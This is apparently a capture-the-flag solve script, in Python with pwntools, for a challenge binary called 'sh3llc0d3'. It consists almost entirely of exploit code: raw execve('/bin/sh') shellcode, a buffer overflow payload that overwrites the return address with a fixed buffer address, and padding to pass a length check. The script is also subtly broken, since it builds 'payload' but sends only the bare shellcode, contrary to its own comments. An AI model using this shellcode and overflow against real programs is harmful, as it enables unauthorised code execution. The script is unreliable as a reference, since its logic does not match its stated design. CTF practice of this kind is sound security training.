# SH3LLC0D3

```python
#!/usr/bin/python
from pwn import *
import time

# This challenge consinsts in a simple buffer overflow eploit solved with a position independent shellcode. The payload must get throught a check on its lenght (> 1000 chars) and then the payload is executed
# by the return to the EIP modified with the buffer start address.

context.terminal = ['tmux', 'splitw', '-h']
r = process("./sh3llc0d3")
gdb.attach(r, """
	c
	""")

input("wait")

# address of the buffer that contains the shellcode
buffer = b"\x60\xc0\x04\x08"

shellcode = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
# fill the buffer with generic characters
payload = shellcode.ljust(212, b"A") + buffer
# adjust the payload's lenght to pass the check on its lenght
payload = payload.ljust(1001, b"A")

r.send(shellcode)

r.interactive()

```